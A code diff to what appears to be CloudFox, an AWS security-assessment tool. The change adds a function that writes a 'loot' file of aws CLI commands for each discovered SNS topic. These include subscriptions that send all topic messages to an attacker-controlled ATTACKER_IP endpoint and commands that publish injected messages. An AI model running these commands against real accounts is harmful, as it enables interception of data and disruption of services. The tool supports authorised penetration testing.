@@ -9,6 +9,7 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"unicode/utf8"
 
 	"github.com/BishopFox/cloudfox/internal"
 	"github.com/BishopFox/cloudfox/internal/aws/policy"
@@ -110,15 +111,8 @@ func (m *SNSModule) PrintSNS(outputFormat string, outputDirectory string, verbos
 	m.output.Headers = []string{
 
 		"ARN",
-		//"Name",
-		//"Region",
 		"Public?",
-		//"Stmt",
 		"Resource Policy Summary",
-		//"Who?",
-		//"Cond. Public",
-		//"Can do what?",
-		//"Conditions?",
 	}
 
 	sort.SliceStable(m.Topics, func(i, j int) bool {
@@ -130,18 +124,9 @@ func (m *SNSModule) PrintSNS(outputFormat string, outputDirectory string, verbos
 		m.output.Body = append(
 			m.output.Body,
 			[]string{
-				//m.Topics[i].Name,
-				//m.Topics[i].Region,
 				m.Topics[i].ARN,
 				m.Topics[i].IsPublic,
-
-				//m.Topics[i].Statement,
 				m.Topics[i].ResourcePolicySummary,
-				//m.Topics[i].Access,
-				//m.Topics[i].IsConditionallyPublic,
-				//m.Topics[i].Actions,
-				//m.Topics[i].ConditionText,
-
 			},
 		)
 
@@ -149,6 +134,7 @@ func (m *SNSModule) PrintSNS(outputFormat string, outputDirectory string, verbos
 	if len(m.output.Body) > 0 {
 		//m.output.OutputSelector(outputFormat)
 		internal.OutputSelector(verbosity, outputFormat, m.output.Headers, m.output.Body, m.output.FilePath, m.output.CallingModule, m.output.CallingModule, m.WrapTable, m.AWSProfile)
+		m.writeLoot(m.output.FilePath, verbosity, m.AWSProfile)
 		fmt.Printf("[%s][%s] %s topics found.\n", cyan(m.output.CallingModule), cyan(m.AWSProfile), strconv.Itoa(len(m.output.Body)))
 		fmt.Printf("[%s][%s] Access policies stored to: %s\n", cyan(m.output.CallingModule), cyan(m.AWSProfile), m.getLootDir())
 	} else {
@@ -186,6 +172,68 @@ func (m *SNSModule) Receiver(receiver chan SNSTopic, receiverDone chan bool) {
 			return
 		}
 	}
+}
+
+func (m *SNSModule) writeLoot(outputDirectory string, verbosity int, profile string) {
+	path := filepath.Join(outputDirectory, "loot")
+	err := os.MkdirAll(path, os.ModePerm)
+	if err != nil {
+		m.modLog.Error(err.Error())
+	}
+	lootCommandsFile := filepath.Join(path, "sns-commands.txt")
+
+	var out string
+	out = out + fmt.Sprintln("#############################################")
+	out = out + fmt.Sprintln("# The profile you will use to perform these commands is most likely not the profile you used to run CloudFox")
+	out = out + fmt.Sprintln("# Set the $profile environment variable to the profile you are going to use to inspect the buckets.")
+	out = out + fmt.Sprintln("# E.g., export profile=dev-prod.")
+	out = out + fmt.Sprintln("#############################################")
+	out = out + fmt.Sprintln("")
+
+	for _, topic := range m.Topics {
+
+		out = out + fmt.Sprintln("# "+strings.Repeat("-", utf8.RuneCountInString(topic.Name)+7))
+		out = out + fmt.Sprintf("# Topic: %s\n", topic.Name)
+		out = out + fmt.Sprintln("# "+strings.Repeat("-", utf8.RuneCountInString(topic.Name)+7))
+		out = out + fmt.Sprintln("# Subscribe to the topic using an attacker controlled HTTP/HTTPS endpoint")
+		out = out + fmt.Sprintln("")
+		out = out + fmt.Sprintf("aws --profile $profile --region %s sns subscribe --topic-arn %s --protocol http --notification-endpoint http://ATTACKER_IP:PORT\n", topic.Region, topic.ARN)
+		out = out + fmt.Sprintf("aws --profile $profile --region %s sns subscribe --topic-arn %s --protocol https --notification-endpoint https://ATTACKER_IP:PORT\n", topic.Region, topic.ARN)
+		out = out + fmt.Sprintln("")
+		out = out + fmt.Sprintln("# NOTE: You will have to confirm the subscription using the URL sent to your attacker controlled http service")
+		out = out + fmt.Sprintln("# NOTE: Once you have confirmed the subscription, your attacker controlled IP will received all messages published to the topic.")
+		out = out + fmt.Sprintln("")
+
+		out = out + fmt.Sprintln("# Publish messages to an existing topic without an attributes file")
+		out = out + fmt.Sprintln("")
+		out = out + fmt.Sprintln("# WARNING: The following command can cause adverse effects in the environment. Like fuzzing a web application, if you inject")
+		out = out + fmt.Sprintln("# WARNING: malicious data you might find a vulnerability, but you also might break something. Unless you really know how the")
+		out = out + fmt.Sprintln("# WARNING: messages are consumed, you should leave fuzzing to non-production environments.")
+		out = out + fmt.Sprintf("aws --profile $profile --region %s sns publish --topic-arn %s --message \"[INSERT MESSAGE BODY]\"\n\n", topic.Region, topic.ARN)
+		out = out + fmt.Sprintln("")
+		out = out + fmt.Sprintln("# Send message to the queue with attributes file (You'll have to create and populate the file)")
+		out = out + fmt.Sprintln("")
+		out = out + fmt.Sprintln("# WARNING: The following command can cause adverse effects in the environment. Like fuzzing a web application, if you inject")
+		out = out + fmt.Sprintln("# WARNING: malicious data you might find a vulnerability, but you also might break something. Unless you really know how the")
+		out = out + fmt.Sprintln("# WARNING: messages are consumed, you should leave fuzzing to non-production environments.")
+		out = out + fmt.Sprintf("aws --profile $profile --region %s  sns publish --topic-arn %s --message \"[INSERT MESSAGE BODY] --message-attributes file://./file.json\"\n\n", topic.Region, topic.ARN)
+
+	}
+
+	err = os.WriteFile(lootCommandsFile, []byte(out), 0644)
+	if err != nil {
+		m.modLog.Error(err.Error())
+	}
+
+	if verbosity > 2 {
+		fmt.Println()
+		fmt.Printf("[%s][%s] %s \n", cyan(m.output.CallingModule), cyan(m.AWSProfile), green("Use the commands below to send/receive sqs messages if you have right permissions."))
+		fmt.Print(out)
+		fmt.Printf("[%s][%s] %s \n", cyan(m.output.CallingModule), cyan(m.AWSProfile), green("End of loot file."))
+	}
+
+	fmt.Printf("[%s][%s] Loot written to [%s]\n", cyan(m.output.CallingModule), cyan(m.AWSProfile), lootCommandsFile)
+
 }
 
 func (m *SNSModule) getSNSTopicsPerRegion(r string, wg *sync.WaitGroup, semaphore chan struct{}, dataReceiver chan SNSTopic) {
